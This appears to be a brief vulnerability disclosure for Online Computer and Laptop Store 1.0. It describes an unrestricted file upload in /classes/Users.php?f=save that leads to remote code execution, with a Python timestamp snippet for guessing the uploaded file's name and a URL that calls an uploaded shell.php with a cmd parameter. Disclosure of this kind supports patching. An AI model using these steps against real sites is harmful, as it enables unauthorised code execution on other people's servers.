# php-ocls
php-ocls
Online Computer and Laptop Store 1.0 allows Unrestricted file upload and can lead to remote code execution. The vulnerability located in /classes/Users.php?f=save. The name of the uploaded file can be easily obtained through the timestamp.

![图片](https://user-images.githubusercontent.com/58156046/233908793-43f8a51e-ea97-4bc1-a133-24040bd21e12.png)

1. Send the request and note when it was sent.

![图片](https://raw.githubusercontent.com/Jadore147258369/php-ocls/main/1.png)

2. Calculate the timestamp.

``` 
import time


timeArray = time.strptime('2023-04-24 13:40:00', "%Y-%m-%d %H:%M:%S")
time_format= time.mktime(timeArray)
print(int(time_format))
```

3. Get Shell.
http://192.168.3.43/php-ocls/uploads/1682314800_shell.php?cmd=phpinfo();

![asdasdasd](https://raw.githubusercontent.com/Jadore147258369/php-ocls/main/2.png)
